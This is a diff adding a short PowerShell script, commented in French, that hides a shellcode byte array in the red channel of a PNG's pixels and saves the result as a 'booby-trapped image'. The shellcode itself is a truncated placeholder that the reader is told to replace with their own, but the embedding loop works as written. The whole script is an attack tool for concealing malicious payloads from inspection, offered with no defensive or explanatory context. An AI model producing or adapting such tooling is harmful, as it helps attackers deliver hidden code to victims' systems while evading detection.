@@ -1,0 +1,23 @@
+# 1. Charger l'image
+$img = [System.Drawing.Image]::FromFile("C:\Users\Public\photo.png")
+$bmp = New-Object System.Drawing.Bitmap($img)
+
+# 2. Ton Shellcode (mets le tien ici)
+[Byte[]] $sc = 0xfc,0x48,0x83,0xe4,0xf0,0xe8... 
+
+# 3. Boucle d'injection dans les pixels
+$index = 0
+for ($y = 0; $y -lt $bmp.Height; $y++) {
+    for ($x = 0; $x -lt $bmp.Width; $x++) {
+        if ($index -lt $sc.Length) {
+            $pixel = $bmp.GetPixel($x, $y)
+            # On cache l'octet dans la composante ROUGE du pixel
+            $newPixel = [System.Drawing.Color]::FromArgb($pixel.A, $sc[$index], $pixel.G, $pixel.B)
+            $bmp.SetPixel($x, $y, $newPixel)
+            $index++
+        }
+    }
+}
+
+# 4. Sauvegarder l'image piégée
+$bmp.Save("C:\Users\Public\photo_finale.png", [System.Drawing.Imaging.ImageFormat]::Png)
